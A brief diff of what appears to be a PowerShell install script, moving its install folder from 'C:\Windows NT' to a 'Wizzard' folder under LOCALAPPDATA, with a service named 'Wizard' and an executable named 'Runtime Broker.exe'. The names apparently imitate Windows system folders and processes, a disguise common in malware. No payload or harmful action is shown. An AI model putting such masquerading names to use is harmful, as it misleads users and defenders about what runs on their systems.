@@ -1,4 +1,4 @@
-$root = "C:\Windows NT"
+$root = Join-Path -Path $env:LOCALAPPDATA -ChildPath "Wizzard"
 $servicio = "Wizard"
 $ejecutable = "Runtime Broker.exe"
 $rootFile = Join-Path -Path $root -ChildPath $ejecutable
